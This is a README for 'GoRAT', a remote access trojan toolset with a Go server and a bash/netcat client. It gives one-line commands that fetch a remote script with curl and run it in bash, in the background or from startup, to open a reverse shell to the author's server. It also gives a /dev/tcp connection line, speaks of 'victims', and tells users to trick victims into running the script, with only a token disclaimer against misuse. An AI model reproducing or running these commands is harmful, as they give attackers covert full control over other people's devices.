# GoRAT
This is a [remote access trojan](https://www.fortinet.com/resources/cyberglossary/remote-access-trojan) toolset.

* server is written in Go
* client is utilizing the networking tool `netcat` which is distributed on most systems. (still under development)

If a victim unintentionally executed the command below, I will have full control over his/her device via a reverse shell.

```sh
# when manually run just once
nohup bash <(curl https://raw.githubusercontent.com/yanxurui/gorat/main/clickme.sh) &
# or when added to the startup script
bash <(curl https://raw.githubusercontent.com/yanxurui/gorat/main/clickme.sh) > /dev/null 2>&1 &
```

Of course, I am using this tool to manage my remote devices, such as router at home, behind NAT.
Please don't use it for any form of exploitation.

## Server
The server listens to a single port (8090 by default) but it can accept more than one remote or local connections.
Remote connections are initiated from the victims' computers by executing `clickme.sh` which will start a reverse shell.
Local connection can list all remote connections and select one of them to run any command in the reverse shell.

A echo remote peer can be setup by `tee >& /dev/tcp/yanxurui.cc/8090 <&1`

## Client
As long as the client has internet access and has bash installed, it can be exploited. It's your responsibility to fool the victim into running the shell script.


## Development
### Test
```sh
go test
go test . -run Dis
go test . -run TestRemoteDisconnected -v
```
